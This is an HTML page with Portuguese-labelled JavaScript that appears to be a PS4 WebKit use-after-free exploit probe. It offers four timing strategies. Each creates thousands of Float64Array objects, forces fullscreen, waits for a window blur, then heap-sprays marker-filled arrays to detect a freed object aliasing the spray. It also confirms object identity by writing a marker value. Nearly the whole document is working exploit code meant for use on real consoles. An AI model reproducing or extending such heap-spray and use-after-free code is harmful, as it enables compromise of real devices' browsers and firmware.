<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Multi-Timing Strategies [v3.0]</h1>
    <button onclick="strategy1()">ESTRATÉGIA 1: Clássica (blur imediato)</button><br><br>
    <button onclick="strategy2()">ESTRATÉGIA 2: GC Forçado (delay 100ms)</button><br><br>
    <button onclick="strategy3()">ESTRATÉGIA 3: Spray Duplo (pre+post)</button><br><br>
    <button onclick="strategy4()">ESTRATÉGIA 4: Loop Agressivo (10 tentativas)</button><br><br>
    <button onclick="selfTest()">AUTO-DIAGNÓSTICO</button>
    <hr>
    <div id="c"></div>

    <script>
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            if(clean.length !== 16) return 0.0;
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        const P_A = h2f("0x4141414141414141");
        const P_B = h2f("0x4242424242424242");
        const M_V = h2f("0xDEADBEEFCAFEBABE");
        const W_V = h2f("0x1337133713371337");

        function log(tag, status, msg) {
            const colors = { PASS: "green", FAIL: "red", ERR: "orange", INFO: "blue", WARN: "purple" };
            const color = colors[status] || "black";
            document.getElementById('c').innerHTML += 
                `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
        }

        function clear() {
            document.getElementById('c').innerHTML = '';
        }

        function forceGC() {
            // Tenta forçar garbage collection
            const trash = [];
            for(let i = 0; i < 1000; i++) {
                trash.push(new Float64Array(100));
            }
            trash.length = 0;
        }

        function testUAF(ctrls, spray) {
            for(let i = 0; i < ctrls.length; i++) {
                if(ctrls[i][0] === P_A) {
                    log("UAF", "PASS", `✅ Detectado no Index ${i}`);
                    
                    // Teste rápido de identidade
                    ctrls[i][4] = M_V;
                    for(let j = 0; j < spray.length; j++) {
                        if(spray[j][4] === M_V) {
                            log("TEST", "PASS", `Identity confirmada: corr ⇄ spray[${j}]`);
                            return { success: true, corr: ctrls[i], idx: i };
                        }
                    }
                    return { success: true, corr: ctrls[i], idx: i };
                }
            }
            return { success: false };
        }

        function selfTest() {
            clear();
            log("SELF", "INFO", "=== AUTO-DIAGNÓSTICO ===");
            
            const tests = [
                { hex: "0x4141414141414141", name: "P_A" },
                { hex: "0xdeadbeefcafebabe", name: "M_V" }
            ];
            
            let ok = true;
            for(let t of tests) {
                const val = h2f(t.hex);
                const got = f2h(val);
                if(got.toLowerCase() === t.hex.toLowerCase()) {
                    log("SELF", "PASS", `${t.name}: ${got}`);
                } else {
                    log("SELF", "FAIL", `${t.name}: ${got} != ${t.hex}`);
                    ok = false;
                }
            }
            
            const arr = new Float64Array(2);
            arr[0] = P_A;
            arr[1] = M_V;
            if(f2h(arr[0]) === f2h(P_A) && f2h(arr[1]) === f2h(M_V)) {
                log("SELF", "PASS", "Float64Array OK");
            } else {
                log("SELF", "FAIL", "Float64Array corrompido");
                ok = false;
            }
            
            if(ok) {
                log("SELF", "PASS", "✅ Sistema OK - Tente as estratégias de timing");
            } else {
                log("SELF", "FAIL", "❌ Sistema incompatível - Não é PS4?");
            }
        }

        // ESTRATÉGIA 1: Clássica (blur imediato)
        function strategy1() {
            clear();
            log("S1", "INFO", "=== ESTRATÉGIA 1: Blur Imediato ===");
            log("S1", "INFO", "Criando 5000 ctrls...");
            
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                ctrls.push(new Float64Array(8));
                ctrls[i][0] = i;
            }
            
            log("S1", "INFO", "Aguarde fullscreen, então aperte OPTIONS");
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log("S1", "INFO", "Blur! Spray imediato...");
                
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    spray.push(new Float64Array(8));
                    spray[i].fill(P_A);
                }
                
                const result = testUAF(ctrls, spray);
                if(!result.success) {
                    log("S1", "FAIL", "UAF não detectado. Tente ESTRATÉGIA 2.");
                }
            };
        }

        // ESTRATÉGIA 2: GC Forçado com delay
        function strategy2() {
            clear();
            log("S2", "INFO", "=== ESTRATÉGIA 2: GC Forçado ===");
            log("S2", "INFO", "Criando 5000 ctrls...");
            
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                ctrls.push(new Float64Array(8));
                ctrls[i][0] = i;
            }
            
            log("S2", "INFO", "Aguarde fullscreen, então aperte OPTIONS");
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log("S2", "INFO", "Blur! Forçando GC...");
                forceGC();
                
                setTimeout(function() {
                    log("S2", "INFO", "Spray após 100ms...");
                    
                    let spray = [];
                    for(let i = 0; i < 8000; i++) {
                        spray.push(new Float64Array(8));
                        spray[i].fill(P_A);
                    }
                    
                    const result = testUAF(ctrls, spray);
                    if(!result.success) {
                        log("S2", "FAIL", "UAF não detectado. Tente ESTRATÉGIA 3.");
                    }
                }, 100);
            };
        }

        // ESTRATÉGIA 3: Spray Duplo (antes E depois do blur)
        function strategy3() {
            clear();
            log("S3", "INFO", "=== ESTRATÉGIA 3: Spray Duplo ===");
            log("S3", "INFO", "Criando pre-spray de 3000 arrays...");
            
            let preSpray = [];
            for(let i = 0; i < 3000; i++) {
                preSpray.push(new Float64Array(8));
                preSpray[i].fill(P_B); // Padrão diferente
            }
            
            log("S3", "INFO", "Criando 5000 ctrls...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                ctrls.push(new Float64Array(8));
                ctrls[i][0] = i;
            }
            
            log("S3", "INFO", "Aguarde fullscreen, então aperte OPTIONS");
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log("S3", "INFO", "Blur! Post-spray...");
                
                let postSpray = [];
                for(let i = 0; i < 8000; i++) {
                    postSpray.push(new Float64Array(8));
                    postSpray[i].fill(P_A);
                }
                
                const result = testUAF(ctrls, postSpray);
                if(!result.success) {
                    log("S3", "FAIL", "UAF não detectado. Tente ESTRATÉGIA 4 (mais agressiva).");
                }
            };
        }

        // ESTRATÉGIA 4: Loop Agressivo (10 tentativas com timings diferentes)
        function strategy4() {
            clear();
            log("S4", "INFO", "=== ESTRATÉGIA 4: Loop Agressivo ===");
            log("S4", "WARN", "10 tentativas automáticas - NÃO saia do fullscreen!");
            log("S4", "INFO", "Aguarde fullscreen, então aperte OPTIONS UMA VEZ");
            
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                ctrls.push(new Float64Array(8));
                ctrls[i][0] = i;
            }
            
            document.documentElement.webkitRequestFullscreen();
            
            let attemptCount = 0;
            window.onblur = function() {
                if(attemptCount === 0) {
                    log("S4", "INFO", "Blur detectado! Iniciando loop...");
                }
                
                attemptCount++;
                log("S4", "INFO", `Tentativa ${attemptCount}/10...`);
                
                // GC forçado
                forceGC();
                
                // Delay variável (0ms, 50ms, 100ms, 200ms...)
                const delays = [0, 50, 100, 150, 200, 300, 500, 750, 1000, 1500];
                const delay = delays[attemptCount - 1] || 1000;
                
                setTimeout(function() {
                    let spray = [];
                    const spraySize = 8000 + (attemptCount * 1000); // Aumenta gradualmente
                    
                    for(let i = 0; i < spraySize; i++) {
                        spray.push(new Float64Array(8));
                        spray[i].fill(P_A);
                    }
                    
                    log("S4", "INFO", `Spray: ${spraySize} arrays, delay: ${delay}ms`);
                    
                    const result = testUAF(ctrls, spray);
                    
                    if(result.success) {
                        log("S4", "PASS", `✅ SUCESSO na tentativa ${attemptCount}!`);
                        log("S4", "INFO", `Configuração vencedora: delay=${delay}ms, spray=${spraySize}`);
                        window.onblur = null; // Para o loop
                    } else if(attemptCount >= 10) {
                        log("S4", "FAIL", "❌ 10 tentativas falharam");
                        log("S4", "INFO", "POSSÍVEIS CAUSAS:");
                        log("S4", "INFO", "1. Firmware tem proteções anti-UAF (>= 10.00?)");
                        log("S4", "INFO", "2. Não é PS4 (testando em PC?)");
                        log("S4", "INFO", "3. WebKit muito antigo/novo");
                        log("S4", "WARN", "RECOMENDAÇÃO: Verifique firmware e ambiente");
                    } else {
                        log("S4", "INFO", "Continuando...");
                    }
                }, delay);
            };
        }
    </script>
</body>
</html>
